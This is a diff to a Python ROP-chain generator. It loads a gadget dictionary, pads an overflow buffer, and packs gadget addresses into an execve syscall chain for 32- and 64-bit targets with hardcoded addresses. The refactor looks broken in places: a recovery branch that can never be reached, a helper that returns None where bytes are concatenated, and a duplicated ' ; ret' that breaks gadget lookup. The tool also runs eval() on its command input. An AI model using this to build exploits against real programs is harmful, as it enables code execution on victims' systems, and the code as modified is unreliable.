@@ -29,48 +29,21 @@ def LoadGadgetDictionary(filename):
             gadget = vals[1].lstrip().rstrip('\n')
             gadgetdictionary.update({gadget : memoryLocation})
 
-def CreateROPChain(command, bufflength, gadgetfile, bits):
-    LoadGadgetDictionary(gadgetfile)
-    global WORD_LEN
-    global DATA_ADDRESS
-    global A_REGISTER
-    global ARG_START_REGISTER
-    global ARG_END_REGISTER
-    global STACK_BUILD_REGISTER
-    global EXECVE_VALUE
-    global SYSCALL
-    global WORD_TYPE
-    global PACK_TYPE
-
-    WORD_LEN = int(bits/8)
-    print(WORD_LEN)
-    if WORD_LEN != 4 and WORD_LEN != 8:
-        print("Unknown Bit Number")
-        quit()
-
-    if WORD_LEN == 4:
+def InitValues(bits):
+    if bits == 32:
        print("Loading 32bit Mode...")
-       DATA_ADDRESS = 0x080da060
-       A_REGISTER = "eax"
-       ARG_START_REGISTER = "ebx"
-       ARG_END_REGISTER = "ecx"
-       STACK_BUILD_REGISTER = "edx"
-       EXECVE_VALUE = 11
-       SYSCALL = "int 0x80"
-       WORD_TYPE = "dword"
-       PACK_TYPE = "<I"
-       
-    if WORD_LEN == 8:
-       print("Loading 64bit Mode...")
-       DATA_ADDRESS = 0x00000000006b90e0
-       A_REGISTER = "rax"
-       ARG_START_REGISTER = "rbx"
-       ARG_END_REGISTER = "rdi"
-       STACK_BUILD_REGISTER = "rsi"
-       EXECVE_VALUE = 59
-       SYSCALL = "syscall"
-       WORD_TYPE = "qword"
-       PACK_TYPE = "<Q"
+       return 4,  0x080da060, "eax", "ebx", "ecx", "edx", 11, "int 0x80", "dword", "<I"
+    if bits == 64:
+        print("Loading 64bit Mode...")
+        return 8,  0x00000000006b90e0, "rax", "rbx", "rdi", "rsi", 59, "syscall", "qword", "<Q"
+    print("Unknown Bit Number")
+    quit()
+
+def CreateROPChain(command, bufflength, gadgetfile, bits):
+    global WORD_LEN, DATA_ADDRESS, A_REGISTER, ARG_START_REGISTER, ARG_END_REGISTER, STACK_BUILD_REGISTER, EXECVE_VALUE, SYSCALL, WORD_TYPE, PACK_TYPE
+    
+    LoadGadgetDictionary(gadgetfile)
+    WORD_LEN, DATA_ADDRESS, A_REGISTER, ARG_START_REGISTER, ARG_END_REGISTER, STACK_BUILD_REGISTER, EXECVE_VALUE, SYSCALL, WORD_TYPE, PACK_TYPE = InitValues(bits)
 
     if command[0:6] == "execve":
         return execve([eval(x.strip()) for x in command[7:-1].split(',')], bufflength)
@@ -81,6 +54,8 @@ def SplitListOnData(Gadgets):
     sections = [Gadgets[i:j] for i, j in zip([0] + datavaluelocations, datavaluelocations + ([len(Gadgets)] if datavaluelocations[-1] != len(Gadgets) else []))]
     return sections
 
+def ReplaceMissingGadget(gadget):
+    return None
 
 def WriteAsChain(Gadgets, bufflength):
     chain = b'A' * bufflength
@@ -95,20 +70,30 @@ def WriteAsChain(Gadgets, bufflength):
         count = len(section)
         idx = 0
         while idx < len(section) and count > 0:
-            if type(section[idx]) is int:
-                chain += pack(PACK_TYPE, section[idx])
-                print("adding address: <" + str(section[idx]) + ">")
+            if count == 0:
+                print("missing gadget : <" + str(section[idx]) + ">")
+                print("attempting to recover...")
+                chain += ReplaceMissingGadget(section[idx])
                 idx += 1
                 count = len(section) - idx
-            g = " ; ".join([str(x) for x in section[idx:idx+count]])
+
+            if type(section[idx]) is int:
+                chain += pack(PACK_TYPE, section[idx])
+                print("adding address : <" + str(section[idx]) + ">")
+                idx += 1
+                count = len(section) - idx
+
+            g = " ; ".join([str(x) for x in section[idx:idx+count]]) + " ; ret"
             if g + " ; ret" in gadgetdictionary:
                 chain += pack(PACK_TYPE, A2R(g + " ; ret"))
-                print("adding gadget: <" + g + " ; ret>")
+                print("adding gadget  : <" + g + " ; ret>")
                 idx += count
                 count = len(section) - idx
                 continue
+
             count -= 1
         chain += sectionender  
+        print("adding bytes   : <" + str(sectionender) + ">")
 
     return chain
 
